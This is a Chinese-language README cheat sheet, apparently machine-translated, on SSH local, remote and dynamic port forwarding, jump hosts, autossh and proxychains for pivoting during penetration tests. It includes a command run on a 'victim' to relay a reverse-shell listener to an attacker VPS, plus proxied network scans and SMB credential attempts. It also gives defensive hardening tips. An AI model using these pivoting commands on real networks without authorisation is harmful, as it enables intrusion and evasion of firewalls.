<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 SSH 隧道和代理链 - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="SSH 隧道">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p对齐=“中心”>
  <b>🚇 具有 Proxychains-ng 集成的本地 (-L)、远程/反向 (-R) 和动态 SOCKS (-D) SSH 隧道的综合参考</b>
</p>

---

## 📋 目录

- [概述和隧道架构](#-overview--tunneling-architectures)
- [本地端口转发 (`-L`)](#-local-port-forwarding--l)
  - [语法与机制](#syntax--mechanics)
  - [转发内部 Web 界面](#forwarding-an-internal-web-interface)
  - [转发远程数据库端口](#forwarding-remote-database-ports)
- [远程/反向端口转发 (`-R`)](#-remote--reverse-port-forwarding--r)
  - [语法与机制](#syntax--mechanics-1)
  - [公开本地反向 Shell 处理程序](#exusing-local-reverse-shell-handler)
  - [中继来自 DMZ 的入站流量](#relaying-inbound-traffic-from-dmz)
- [动态 SOCKS 转发 (`-D`)](#-dynamic-socks-forwarding--d)
  - [语法和 SOCKS5 设置](#syntax--socks5-setup)
- [Proxychains-ng 配置](#-proxychains-ng-configuration)
  - [配置 `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [通过 Proxychains 路由 CLI 工具](#routing-cli-tools-through-proxychains)
- [多跳旋转和跳转主机 (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [使用 Autossh 的持久隧道](#-persistent-tunnels-with-autossh)
- [交互式 SSH 转义序列 (`~C`)](#-interactive-ssh-escape-sequences-c)
- [快速参考表](#-quick-reference-table)
- [防御考虑因素和 OPSEC](#-defective-considerations--opsec)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和隧道架构

SSH 不仅仅是一个远程终端客户端；它是一个加密的双向字节流传输层，可以规避限制性的出口/入口防火墙策略：

1. **本地端口转发（`-L`）：**在**攻击者本地机器**上打开监听端口；连接通过 SSH 建立隧道并转发到远程 SSH 服务器可访问的目标。
2. **远程端口转发（`-R`）：** 在**远程SSH服务器**上打开监听端口；传入连接通过隧道传输回攻击者的本地计算机或内部目标。
3. **动态端口转发 (`-D`)：** 将 SSH 客户端转变为本地 **SOCKS4/SOCKS5 代理**，允许工具（Nmap、Burp Suite、Ffuf、Metasploit）通过远程网络路由任意 TCP 流量。
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 本地端口转发 (`-L`)

### 语法和机制
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### 转发内部 Web 界面
通过 Pivot `10.10.10.200` 访问 `172.16.0.15:80` 上的 Web 管理面板：
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*现在在本地浏览器中浏览到 `http://127.0.0.1:8080`。*

### 转发远程数据库端口
访问仅绑定到远程服务器上的 `127.0.0.1:5432` 的内部 PostgreSQL 数据库：
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!注意]
> 使用的标志：
> - `-N`：不执行远程 shell 命令（仅限隧道）。
> - `-f`：在命令执行之前立即在后台运行。

---

## 🔄 远程/反向端口转发 (`-R`)

### 语法和机制
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### 暴露本地反向 Shell 处理程序
从 NAT 后面受感染的目标计算机，突破出站防火墙，将流量发送到 VPS 上的外部侦听器：
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### 中继来自 DMZ 的入站流量
将远程 Pivot 上的端口 8080 转发到本地端口 80：
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!重要]
> 要将远程端口绑定到所有接口 (`0.0.0.0`)，SSH 服务器的 `/etc/ssh/sshd_config` 必须设置：
> `GatewayPorts yes` 或 `GatewayPorts clientspecified`。

---

## 🌐 动态 SOCKS 转发 (`-D`)

### 语法和 SOCKS5 设置
在本地端口 `1080` 上创建动态 SOCKS5 代理：
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
验证 SOCKS 代理是否正在侦听：
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Proxychains-ng 配置

Proxychains 通过 `LD_PRELOAD` 拦截动态库网络调用（`connect()`、`gethostbyname()`），以强制标准 CLI 应用程序通过 SOCKS/HTTP 代理。

### 配置`/etc/proxychains4.conf`
编辑配置文件以指向您的 SSH 动态 SOCKS 隧道：
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### 通过代理链路由 CLI 工具
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 多跳旋转和跳跃主机 (`-J`)

当穿越多个分段防火墙边界时：
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 使用 Autossh 建立持久隧道

当 SSH 隧道由于网络超时或 NAT 丢弃而断开时，`autossh` 会自动监控并重新启动 SSH 连接：
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ 交互式 SSH 转义序列 (`~C`)

如果您已经打开了交互式 SSH 会话，并且突然需要打开端口转发而不断开连接：

1. 按`Enter`
2. 类型 `~C`（波浪号后跟大写 C）
3、提示符变为`ssh> `
4. 动态添加您的转发规则：
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
或者创建动态 SOCKS：
   ```text
   ssh> -D 1080
   ```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **本地端口转发** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **远程端口转发** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **动态 SOCKS5 代理**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **背景寂静隧道** | `ssh -f -N -D 1080 user@pivot` |
| **跳跃主机枢轴** | `ssh -J user@hop1,user@hop2 target` |
| **通过代理链运行工具** | `proxychains4 <TOOL> <ARGS>` |
| **持续自动重新连接** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **动态隧道** | `Enter` 然后 `~C` -> `ssh> -D 1080` |

---

## 🛡️ 防御考虑和 OPSEC

1. **在 SSHD 中禁用端口转发：** 在强化生产系统上的 `/etc/ssh/sshd_config` 中设置 `AllowTcpForwarding no` 和 `PermitTunnel no`。
2. **网络流异常检测：** 传输大量双向字节流的持续长时间运行的 SSH 会话通常表明交互式隧道或数据泄露。

---

## ⚠️ 法律免责声明

> [!警告]
> SSH 隧道和网络枢轴只能在已获得明确书面授权的网络和系统上执行。未经授权绕过外围网络防火墙是非法的。